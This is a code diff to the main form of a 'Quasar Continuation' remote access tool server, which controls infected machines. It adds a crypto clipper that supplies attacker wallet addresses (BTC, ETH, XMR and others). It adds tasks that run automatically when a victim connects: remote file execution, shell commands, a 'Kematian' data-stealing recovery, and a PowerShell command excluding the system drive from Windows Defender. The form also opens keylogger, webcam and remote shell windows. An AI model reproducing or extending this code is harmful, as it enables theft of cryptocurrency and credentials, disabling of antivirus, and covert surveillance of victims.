@@ -36,19 +36,30 @@ namespace Quasar.Server.Forms
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
         private readonly ClientStatusHandler _clientStatusHandler;
+        private readonly GetCryptoAddressHandler _getCryptoAddressHander;
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
 
         private PreviewHandler _previewImageHandler;
 
-
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
+            _getCryptoAddressHander = new GetCryptoAddressHandler();
             RegisterMessageHandler();
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
+        }
+
+
+        private void OnAddressReceived(object sender, Client client, string addressType)
+        {
+            if (this.InvokeRequired)
+            {
+                this.Invoke(new Action(() => OnAddressReceived(sender, client, addressType)));
+                return;
+            }
         }
 
         /// <summary>
@@ -61,6 +72,8 @@ namespace Quasar.Server.Forms
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
             //MessageHandler.Register(new GetPreviewImageHandler());
+            MessageHandler.Register(_getCryptoAddressHander);
+            _getCryptoAddressHander.AddressReceived += OnAddressReceived;
         }
 
         /// <summary>
@@ -72,6 +85,8 @@ namespace Quasar.Server.Forms
             _clientStatusHandler.StatusUpdated -= SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
+            MessageHandler.Unregister(_getCryptoAddressHander);
+            _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
         }
 
         public void UpdateWindowTitle()
@@ -166,11 +181,26 @@ namespace Quasar.Server.Forms
             }
         }
 
+        public void EventLogVisability()
+        {
+            if (Settings.EventLog)
+            {
+                DebugLogRichBox.Visible = true;
+                splitter1.Visible = true;
+            } else
+            {
+                DebugLogRichBox.Visible = false;
+                splitter1.Visible = false;
+            }
+        }
+
         private void FrmMain_Load(object sender, EventArgs e)
         {
+            EventLog("Welcome to Quasar Continuation.", "info");
             //SetEqualColumnWidths();
             InitializeServer();
             AutostartListening();
+            EventLogVisability();
             notifyIcon.Visible = false;
         }
 
@@ -186,6 +216,66 @@ namespace Quasar.Server.Forms
             notifyIcon.Visible = false;
             notifyIcon.Dispose();
         }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        public void EventLog(string message, string level)
+        {
+            try
+            {
+                if (DebugLogRichBox.InvokeRequired)
+                {
+                    DebugLogRichBox.Invoke(new Action(() => LogMessage(message, level)));
+                }
+                else
+                {
+                    LogMessage(message, level);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Error in EventLog: {ex.Message}");
+            }
+        }
+
+        private void LogMessage(string message, string level)
+        {
+            try
+            {
+                string timestamp = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
+                string formattedMessage = $"[{timestamp}] {message}";
+                System.Drawing.Color logColor = System.Drawing.Color.White;
+
+                switch (level.ToLower())
+                {
+                    case "normal":
+                        logColor = System.Drawing.Color.White;
+                        break;
+                    case "info":
+                        logColor = System.Drawing.Color.DodgerBlue;
+                        break;
+                    case "error":
+                        logColor = System.Drawing.Color.Red;
+                        break;
+                    default:
+                        logColor = System.Drawing.Color.White;
+                        break;
+                }
+                DebugLogRichBox.AppendText(formattedMessage + Environment.NewLine);
+                DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
+                DebugLogRichBox.SelectionLength = 0;
+                DebugLogRichBox.SelectionColor = logColor;
+                DebugLogRichBox.ScrollToCaret();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Error in LogMessage: {ex.Message}");
+            }
+        }
+
 
         private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
         {
@@ -212,9 +302,11 @@ namespace Quasar.Server.Forms
                 Debug.WriteLine("sending message!!!!!!!!!!!!!!!!!!!!");
 
                 selectedClients[0].Send(image);
+                tableLayoutPanel1.Visible = true;
             }
             else if (selectedClients.Length == 0)
             {
+                tableLayoutPanel1.Visible = false;
                 pictureBoxMain.Image = Properties.Resources.no_previewbmp;
 
                 listView1.Items.Clear();
@@ -337,6 +429,7 @@ namespace Quasar.Server.Forms
                     {
                         case true:
                             AddClientToListview(client.Key);
+                            StartAutomatedTask(client.Key);
                             if (Settings.ShowPopup)
                                 ShowPopup(client.Key);
                             break;
@@ -344,6 +437,63 @@ namespace Quasar.Server.Forms
                             RemoveClientFromListview(client.Key);
                             break;
                     }
+                }
+            }
+        }
+
+        private void StartAutomatedTask(Client client)
+        {
+            if (lstTasks.InvokeRequired)
+            {
+                lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
+                return;
+            }
+
+            foreach (ListViewItem item in lstTasks.Items)
+            {
+                string taskCaption = item.Text; // Get the caption of the item
+                string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
+                string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";
+
+                if (taskCaption == "Remote Execute")
+                {
+                    FileManagerHandler fileManagerHandler = new FileManagerHandler(client);
+                    fileManagerHandler.BeginUploadFile(subItem0, "");
+                }
+                else if (taskCaption == "Shell Command")
+                {
+                    string Code = subItem1;
+                    DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = Code, Host = subItem0 };
+                    client.Send(quickCommand);
+                }
+                else if (taskCaption == "Kematian Recovery")
+                {
+                    var kematianHandler = new KematianHandler(client);
+                    kematianHandler.RequestKematianZip();
+                }
+                else if (taskCaption == "Exclude System Drives")
+                {
+                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                    DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };
+                    bool isClientAdmin = client.Value.AccountType == "Admin" || client.Value.AccountType == "System";
+                    if (isClientAdmin)
+                    {
+                        client.Send(quickCommand);
+                    }
+                    else
+                    {
+
+                    }
+                }
+                else if (taskCaption == "Message Box")
+                {
+                    client.Send(new DoShowMessageBox
+                    {
+                        Caption = subItem0,
+                        Text = subItem1,
+                        Button = "OK",
+                        Icon = "None"
+                    });
                 }
             }
         }
@@ -385,7 +535,7 @@ namespace Quasar.Server.Forms
                 ListViewItem lvi = new ListViewItem(new string[]
                 {
                     " " + client.EndPoint.Address, client.Value.Tag,
-                    client.Value.UserAtPc, client.Value.Version, "Connected", "idk", "Active", client.Value.CountryWithCode,
+                    client.Value.UserAtPc, client.Value.Version, "Connected", "", "Active", client.Value.CountryWithCode,
                     client.Value.OperatingSystem, client.Value.AccountType
                 })
                 { Tag = client, ImageIndex = client.Value.ImageIndex };
@@ -397,7 +547,7 @@ namespace Quasar.Server.Forms
                         lstClients.Items.Add(lvi);
                     }
                 });
-
+                EventLog(client.Value.UserAtPc + " Has connected.", "normal");
                 UpdateWindowTitle();
             }
             catch (InvalidOperationException)
@@ -428,6 +578,7 @@ namespace Quasar.Server.Forms
                     }
                 });
                 UpdateWindowTitle();
+                EventLog(client.Value.UserAtPc + " Has disconnected.", "normal");
             }
             catch (InvalidOperationException)
             {
@@ -843,7 +994,7 @@ namespace Quasar.Server.Forms
         {
 
             string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
-            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode };
+            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };
 
             foreach (Client c in GetSelectedClients())
             {
@@ -945,6 +1096,278 @@ namespace Quasar.Server.Forms
         private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
         {
 
+        }
+
+        // Add key words to the notification centre
+        private void addKeywordsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (var frm = new FrmKeywords())
+            {
+                frm.ShowDialog();
+            }
+        }
+
+        //Add Event to Notification Centre
+
+        public static void AddNotiEvent(FrmMain frmMain, string Client, string Keywords, string WindowText)
+        {
+            if (frmMain.lstNoti.InvokeRequired)
+            {
+                frmMain.lstNoti.Invoke(new Action(() => AddNotiEvent(frmMain, Client, Keywords, WindowText)));
+                return;
+            }
+            ListViewItem item = new ListViewItem(Client);
+            item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
+            item.SubItems.Add(Keywords);
+            while (item.SubItems.Count < 11)
+            {
+                item.SubItems.Add("");
+            }
+            item.SubItems[3].Text = WindowText;
+            frmMain.lstNoti.Items.Add(item);
+        }
+
+        private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MainTabControl.SelectTab(tabPage1);
+        }
+
+        private void notificationCentreToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MainTabControl.SelectTab(tabPage2);
+        }
+
+        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstNoti.SelectedItems.Count > 0)
+            {
+                foreach (ListViewItem item in lstNoti.SelectedItems)
+                {
+                    lstNoti.Items.Remove(item);
+                }
+            }
+            else
+            {
+
+            }
+        }
+
+        private void systemToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void deleteTasksToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstTasks.SelectedItems.Count > 0)
+            {
+                foreach (ListViewItem item in lstTasks.SelectedItems)
+                {
+                    lstTasks.Items.Remove(item);
+                }
+            }
+            else
+            {
+
+            }
+        }
+
+        private void cryptoClipperToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MainTabControl.SelectTab(tabPage3);
+        }
+
+        private void autoTasksToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MainTabControl.SelectTab(tabPage4);
+        }
+
+        private void remoteExecuteToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            using (var frm = new FrmTaskExecute())
+            {
+                frm.ShowDialog();
+            }
+        }
+
+        private void shellCommandToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (var frm = new FrmTaskCommand())
+            {
+                frm.ShowDialog();
+            }
+        }
+
+        private void showMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            using (var frm = new FrmTaskMessageBox())
+            {
+                frm.ShowDialog();
+            }
+        }
+
+        // add task to task Listview (lstTasks)
+        public void AddTask(string title, string param1, string param2)
+        {
+            ListViewItem newItem = new ListViewItem(title);
+            newItem.SubItems.Add(param1);
+            newItem.SubItems.Add(param2);
+            lstTasks.Items.Add(newItem);
+        }
+
+        private void kematianToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            AddTask("Kematian Recovery", "", "");
+        }
+
+        private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            AddTask("Exclude System Drives", "", "");
+        }
+
+        private void groupBox1_Enter(object sender, EventArgs e)
+        {
+
+        }
+
+        // Stop or Start Clipper
+        private void ClipperCheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (ClipperCheckbox.Checked == true)
+            {
+                ClipperCheckbox.Text = "Stop";
+            }
+            else
+            {
+                ClipperCheckbox.Text = "Start";
+            }
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
+                frmFm.Show();
+                frmFm.Focus();
+            }
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
+                frmRs.Show();
+                frmRs.Focus();
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
+                frmRd.Show();
+                frmRd.Focus();
+            }
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
+            }
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
+                frmKl.Show();
+                frmKl.Focus();
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
+                frmWebcam.Show();
+                frmWebcam.Focus();
+            }
+        }
+
+        // Clipper Address to send back to client
+        public string GetBTCAddress() => BTCTextBox.Text;
+        public string GetLTCAddress() => LTCTextBox.Text;
+        public string GetETHAddress() => ETHTextBox.Text;
+        public string GetXMRAddress() => XMRTextBox.Text;
+        public string GetSOLAddress() => SOLTextBox.Text;
+        public string GetDASHAddress() => DASHTextBox.Text;
+        public string GetXRPAddress() => XRPTextBox.Text;
+        public string GetTRXAddress() => TRXTextBox.Text;
+        public string GetBCHAddress() => BCHTextBox.Text;
+
+        private void taskTestToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        //Saving logs of the event logger
+        private void saveLogsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
+            {
+                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
+                saveFileDialog.Title = "Save Log File";
+                saveFileDialog.DefaultExt = "txt";
+
+                if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.Text);
+                }
+            }
+        }
+
+        private void saveSlectedToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrWhiteSpace(DebugLogRichBox.SelectedText))
+            {
+                return;
+            }
+
+            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
+            {
+                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
+                saveFileDialog.Title = "Save Selected Text";
+                saveFileDialog.DefaultExt = "txt";
+
+                if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.SelectedText);
+                }
+            }
+        }
+
+        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            DebugLogRichBox.Clear();
+        }
+
+        private void clearSelectedToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+          
         }
     }
 }
